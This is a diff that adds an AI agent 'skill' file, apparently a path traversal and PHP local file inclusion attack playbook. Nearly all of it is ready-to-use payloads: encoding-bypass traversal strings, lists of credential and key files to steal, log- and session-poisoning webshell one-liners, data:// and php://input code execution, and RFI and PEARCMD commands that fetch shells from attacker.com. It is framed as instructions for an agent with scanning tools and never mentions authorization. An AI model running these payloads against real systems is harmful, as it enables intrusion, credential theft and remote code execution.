@@ -1,0 +1,560 @@
+---
+name: path-traversal
+description: >-
+  Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.
+---
+
+# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Base models miss encoding chains and RCE escalation paths.
+
+## QUICK START
+
+### First-pass probes
+
+| Signal | Probe | Why |
+|---|---|---|
+| File path in parameter? | `../../../../etc/passwd` | Classic traversal test |
+| Path filtering `../`? | `..%2f..%2f..%2fetc%2fpasswd` | URL-encoding bypass |
+| Double-encode filter? | `..%252f..%252f..%252fetc%252fpasswd` | Double-URL-encoding bypass |
+| Windows target? | `..\\..\\..\\windows\\win.ini` | Backslash variant |
+| PHP `include()` suspected? | `php://filter/convert.base64-encode/resource=index` | PHP wrapper for source read |
+
+```bash
+# Quick test — path traversal ladder
+# 1. Basic:    ?file=../../../../etc/passwd
+# 2. Encoded:  ?file=..%2f..%2f..%2fetc%2fpasswd
+# 3. Double:   ?file=..%252f..%252f..%252fetc%252fpasswd
+# 4. Windows:  ?file=..\\..\\..\\windows\\win.ini
+```
+
+---
+
+## RELATED ROUTING
+
+Before deep exploitation, you can first load:
+
+- [upload insecure files](../file-upload/SKILL.md) when the primary attack surface is an upload workflow rather than an include or read primitive
+
+### First-pass traversal chains
+
+```text
+../etc/passwd
+../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..\\..\\..\\windows\\win.ini
+```
+
+---
+
+## 1. CORE CONCEPT
+
+**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
+**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.
+
+```
+http://target.com/index.php?page=home
+→ Opens: /var/www/html/pages/home.php
+
+Traversal attack:
+http://target.com/index.php?page=../../../../etc/passwd
+→ Opens: /etc/passwd
+```
+
+---
+
+## 2. TRAVERSAL SEQUENCE VARIANTS
+
+The filtering strategy determines which encoding to use:
+
+### Basic
+```
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts  (Windows)
+```
+
+### URL Encoding
+```
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
+%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
+```
+
+### Double URL Encoding (when server decodes once, filter checks before decode)
+```
+%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
+..%252f..%252fetc%252fpasswd
+```
+
+### Unicode / Overlong UTF-8
+```
+..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
+..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
+..%ef%bc%8f          ← fullwidth solidus '／'
+```
+
+### Mixed Encodings
+```
+..%2F..%2Fetc%2Fpasswd
+....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
+```
+
+### Filter Strips `../` (so `../` becomes `../` after strip)
+```
+....//          ← becomes ../ after filter strips ../
+..././          ← becomes ../ after filter strips ./
+```
+
+### Null Byte Injection (legacy PHP < 5.3.4)
+```
+../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
+../../../../etc/passwd%00.php
+```
+
+---
+
+## 3. TARGET FILES AND ESCALATION TARGETS
+
+### Linux
+```
+/etc/passwd                  ← user list (usernames, UIDs)
+/etc/shadow                  ← password hashes (requires root-level file read)
+/etc/hosts                   ← internal hostnames → pivot targets
+/etc/hostname                ← server hostname
+/proc/self/environ           ← process environment (DB creds, API keys!)
+/proc/self/cmdline           ← process command line
+/proc/self/fd/0              ← stdin file descriptor
+/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
+/var/log/apache2/access.log  ← for log poisoning
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/auth.log            ← SSH attempt log
+/var/mail/www-data            ← email for www-data user
+/home/USER/.ssh/id_rsa       ← SSH private key
+/home/USER/.ssh/authorized_keys
+/home/USER/.bash_history     ← command history (credentials!)
+/home/USER/.aws/credentials  ← AWS keys
+/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
+```
+
+### Web Application Config Files
+```
+/var/www/html/.env           ← Laravel/Node.js env vars
+/var/www/html/config.php     ← PHP config
+/var/www/html/wp-config.php  ← WordPress DB credentials
+/etc/apache2/sites-enabled/  ← Apache vhosts
+/etc/nginx/sites-enabled/    ← Nginx config
+/usr/local/etc/nginx/nginx.conf
+```
+
+### Windows
+```
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
+C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
+C:\inetpub\wwwroot\global.asa
+C:\xampp\htdocs\wp-config.php
+C:\Users\Administrator\.ssh\id_rsa
+C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
+```
+
+---
+
+## 4. PHP LFI → RCE TECHNIQUES
+
+### Log Poisoning (most reliable when log is accessible)
+**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
+```http
+GET / HTTP/1.1
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+**Step 2**: Include the log file via LFI:
+```
+?page=../../../../var/log/apache2/access.log&cmd=id
+```
+
+### SSH Log Poisoning
+Inject PHP payload as SSH username:
+```bash
+ssh '<?php system($_GET["cmd"]); ?>'@target.com
+```
+Then include `/var/log/auth.log`.
+
+### PHP Session File Poisoning
+**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
+**Step 2**: Include session file:
+```
+?page=../../../../tmp/sess_SESSIONID&cmd=id
+```
+Find session ID from cookie `PHPSESSID`.
+
+### PHP Wrappers for RCE
+
+**`php://expect` wrapper** (requires `expect` PHP extension):
+```
+?page=expect://id
+```
+
+**`php://input` wrapper** (combine LFI with POST body):
+```
+POST ?page=php://input
+Body: <?php system('id'); ?>
+```
+
+**`data://` wrapper** (inject PHP directly as base64):
+```
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
+```
+(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)
+
+---
+
+## 5. PHP FILTER WRAPPER (FILE CONTENT READ)
+
+Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
+```
+?page=php://filter/convert.base64-encode/resource=config.php
+?page=php://filter/convert.base64-encode/resource=/etc/passwd
+?page=php://filter/read=string.rot13/resource=config.php
+?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
+```
+Decode the returned base64 to see the file contents (including PHP source code).
+
+**Chain filters** (multiple transforms to bypass input filters):
+```
+?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
+```
+
+---
+
+## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED
+
+If PHP's `allow_url_include = On` (rare but exists):
+```
+?page=http://attacker.com/shell.txt
+?page=ftp://attacker.com/shell.php
+```
+Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.
+
+---
+
+## 7. SERVER-SPECIFIC PATH TRUNCATION
+
+PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
+```
+?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
+```
+When server appends `.php`, the truncation drops it.
+
+Or null byte if PHP < 5.3.4:
+```
+?page=../../../../etc/passwd%00
+```
+
+---
+
+## 8. PARAMETER LOCATIONS TO TEST
+
+```
+?file=        ?page=        ?include=    ?path=
+?doc=         ?view=        ?load=       ?read=
+?template=    ?lang=        ?url=        ?src=
+?content=     ?site=        ?layout=     ?module=
+```
+
+Also test: HTTP headers, cookies, form `action` values, import/upload features.
+
+---
+
+## 9. FILTER BYPASS CHECKLIST
+
+When `../` is stripped or blocked:
+
+```
+□ Try URL encoding: %2e%2e%2f
+□ Try double URL encoding: %252e%252e%252f
+□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
+□ Try mixed: ..%2F or ..%5C (backslash on Linux)
+□ Try redundant sequences: ....// or ..././ (strip once → still ../)
+□ Try null byte: /../../../etc/passwd%00
+□ Try absolute path: /etc/passwd (if no path prefix added)
+□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
+```
+
+---
+
+## 10. IMPACT ESCALATION PATH
+
+```
+Path traversal (read arbitrary files)
+├── Read /etc/passwd → enumerate users
+├── Read /proc/self/environ → find API keys, DB passwords in env
+├── Read app config files → find credentials → horizontal movement
+├── Read SSH private keys → direct server login
+└── Find log paths → Log Poisoning → LFI RCE
+
+LFI (PHP code inclusion)
+├── Log poisoning → webshell
+├── Session file poisoning → webshell  
+├── php://input → direct code execution
+├── data:// → direct code execution
+└── php://filter → read PHP source code → find more vulnerabilities
+```
+
+---
+
+## 11. LFI TO RCE — ESCALATION PATHS
+
+### 1. /proc/self/fd Brute-Force
+```
+# When file upload exists but path is unknown:
+# Uploaded files get temporary fd in /proc/self/fd/
+# Brute-force fd numbers:
+/proc/self/fd/0 through /proc/self/fd/255
+# Include the temp file before it's cleaned up
+```
+
+### 2. /proc/self/environ Poisoning
+```
+# If User-Agent is reflected in process environment:
+GET /vuln.php?page=/proc/self/environ
+User-Agent: <?php system($_GET['c']); ?>
+```
+
+### 3. Log Poisoning
+```
+# Apache access log:
+GET /<?php system($_GET['c']); ?> HTTP/1.1
+# Then include: /var/log/apache2/access.log
+
+# SSH auth log (username field):
+ssh '<?php system($_GET["c"]); ?>'@target
+# Then include: /var/log/auth.log
+
+# Mail log (SMTP subject):
+MAIL FROM:<attacker@evil.com>
+RCPT TO:<victim@target.com>
+DATA
+Subject: <?php system($_GET['c']); ?>
+.
+# Then include: /var/log/mail.log
+```
+
+### 4. PHP Session File Poisoning
+```
+# Set session variable to PHP code:
+GET /page.php?lang=<?php system($_GET['c']); ?>
+# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
+# Include the session file
+```
+
+### 5. phpinfo() Assisted LFI
+```
+# Race condition: upload via phpinfo() temp file
+# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
+# 2. Include the temp file before PHP cleans it up
+# Requires many concurrent requests (race window ~10ms)
+```
+
+### 6. iconv CVE-2024-2961
+```
+# glibc iconv buffer overflow in PHP filter chains
+# Tool: cfreal/cnext-exploits
+# Converts LFI to RCE without needing writable paths or log poisoning
+```
+
+---
+
+## 12. PHP WRAPPER EXPLOITATION MATRIX
+
+### php://filter (file read without execution)
+```
+# Base64 encode source code:
+php://filter/convert.base64-encode/resource=index.php
+
+# ROT13:
+php://filter/read=string.rot13/resource=index.php
+
+# Chain multiple filters:
+php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
+
+# Zlib compression:
+php://filter/zlib.deflate/resource=index.php
+
+# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
+# Generates chains that write arbitrary content via iconv conversions
+# Tool: synacktiv/php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
+# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
+```
+
+### convert.iconv + dechunk Oracle (blind file read)
+```
+# Error-based oracle: determine if first byte of file matches a character
+# Tool: synacktiv/php_filter_chains_oracle_exploit
+# Reads files byte-by-byte through error/behavior differences
+```
+
+### data:// Wrapper
+```
+# Execute arbitrary PHP:
+data://text/plain,<?php system('id'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+# Bypass when data:// is filtered but data: (without //) works:
+data:text/plain,<?php system('id'); ?>
+```
+
+### expect:// Wrapper
+```
+expect://id
+expect://ls
+# Requires expect extension (rare but check)
+```
+
+### php://input
+```
+POST /vuln.php?page=php://input
+Content-Type: application/x-www-form-urlencoded
+
+<?php system('id'); ?>
+```
+
+### zip:// and phar:// Wrappers
+```
+# zip://: Upload ZIP containing PHP file
+zip:///tmp/upload.zip#shell.php
+
+# phar://: Triggers deserialization of phar metadata!
+phar:///tmp/upload.phar/anything
+# Create malicious phar with crafted metadata object
+# Can chain to RCE via POP gadget chains (like PHP deserialization)
+# Phar can be disguised as JPG (polyglot phar-jpg)
+```
+
+### wrapwrap (prefix/suffix injection)
+```
+# Tool: ambionics/wrapwrap
+# Adds arbitrary prefix and suffix to file content via filter chains
+# Useful for converting file read into XXE, SSRF, or deserialization trigger
+```
+
+---
+
+## 13. PEARCMD LFI TO RCE
+
+When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):
+
+```
+# Method 1: config-create (write arbitrary content to file)
+GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php
+
+# Method 2: man_dir (change docs directory to write path)
+GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php
+
+# Method 3: download (fetch remote file)
+GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php
+
+# Method 4: install (install remote package)
+GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
+```
+
+### Windows FindFirstFile Wildcard
+```
+# Windows << and > wildcards in file paths:
+# << matches any extension, > matches single char
+include("php<<");      # Matches any .php* file
+include("shel>");      # Matches shell.php if only 1 char follows
+# Useful when exact filename is unknown
+```
+
+---
+
+## 14. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS
+
+### Common Vulnerable Parameter Names
+```
+filename    filepath    path        file        url
+template    page        include     dir         document
+folder      root        pg          lang        doc
+conf        data        content     name        src
+inputFile   hdfile      XFileName   FileUrl     readfile
+```
+
+### High-Frequency Vulnerable Endpoints
+| Endpoint Pattern | Frequency |
+|---|---|
+| `down.php` / `download.php` | Very High |
+| `download.jsp` / `download.do` | Very High |
+| `download.asp` / `download.aspx` | High |
+| `readfile.php` / `file.php` | High |
+| `export` / `report` endpoints | Medium |
+| `template` / `preview` endpoints | Medium |
+
+### Bypass Technique Distribution (from field research)
+| Technique | Prevalence |
+|---|---|
+| Absolute path direct access | Most common |
+| WEB-INF/web.xml read (Java) | Common |
+| Base64 encoded path parameter | Moderate |
+| Double URL encoding | Moderate |
+| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
+| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |
+
+---
+
+## DECISION TREE
+
+```
+File inclusion or download point found?
+├── Basic ../ traversal works?
+│   ├── Yes → enumerate target files (passwd, environ, configs, SSH keys)
+│   └── ../ stripped or blocked?
+│       ├── URL encoding (%2e%2e%2f) → double encoding (%252e%252e%252f)
+│       ├── Overlong UTF-8 (..%c0%af) → fullwidth solidus (..%ef%bc%8f)
+│       ├── Redundant sequences (....//  ..././)
+│       ├── Null byte truncation (%00) — legacy PHP < 5.3.4
+│       └── Absolute path (/etc/passwd) — no traversal needed
+├── PHP backend detected (LFI, not just read)?
+│   ├── php://filter → base64-encode PHP source for reading
+│   ├── php://input → POST body as PHP code execution
+│   ├── data:// wrapper → inline PHP execution
+│   ├── expect:// wrapper → direct command execution
+│   ├── zip:// / phar:// → uploaded archive member inclusion
+│   └── PHP filter chain RCE → iconv-based code execution
+├── Log file accessible (/var/log/apache2/access.log)?
+│   └── Log poisoning → inject PHP in User-Agent → include log → RCE
+├── Remote file inclusion possible (allow_url_include=On)?
+│   └── RFI → host remote PHP shell → direct RCE
+├── PEAR installed with register_argc_argv=On?
+│   └── PEARCMD exploitation → config-create/download for file write
+└── Windows server?
+    ├── UNC path (\\127.0.0.1\C$\...) → SMB relay or NTLM capture
+    └── FindFirstFile wildcards (<< >) → filename guessing
+```
+
+## TESTING CHECKLIST
+
+- [ ] Test `../` sequences to traverse directories (`../../../../etc/passwd`, `..\..\..\windows\win.ini`)
+- [ ] Test URL encoding bypass: `%2e%2e%2f`, `%2e%2e%5c`
+- [ ] Test double URL encoding: `%252e%252e%252f` when server decodes once
+- [ ] Test PHP wrappers: `php://filter/convert.base64-encode/resource=`, `php://input`, `data://`, `expect://`, `zip://`, `phar://`
+- [ ] Test null byte injection: `../../../../etc/passwd%00.jpg` (PHP < 5.3.4)
+- [ ] Test double encoding and overlong UTF-8: `..%c0%af`, `..%ef%bc%8f`
+- [ ] Test redundant sequences when `../` is stripped: `....//`, `..././`
+- [ ] Test platform-specific paths: Linux (`/etc/passwd`, `/proc/self/environ`), Windows (`C:\Windows\win.ini`, UNC paths)
+- [ ] Test LFI-to-RCE via log poisoning: inject PHP in User-Agent, include `/var/log/apache2/access.log`
+- [ ] Test LFI-to-RCE via session file poisoning, `php://input`, `data://` wrapper
+- [ ] Test PHP filter chain RCE: `php_filter_chain_generator` for iconv-based exploitation
+- [ ] Test PEARCMD exploitation when `register_argc_argv=On`
+
+## MCP TOOLS
+
+| Tool | Use Case |
+|------|----------|
+| `ffuf_scan` | Fuzz directory/file paths for traversal targets |
+| `feroxbuster_scan` | Recursive content discovery with path traversal probes |
+| `http_framework_test` | Send crafted traversal payloads and analyze responses |
+| `http_repeater` | Replay and modify traversal probe requests |
+| `dirsearch_scan` | Directory brute forcing with custom extensions |
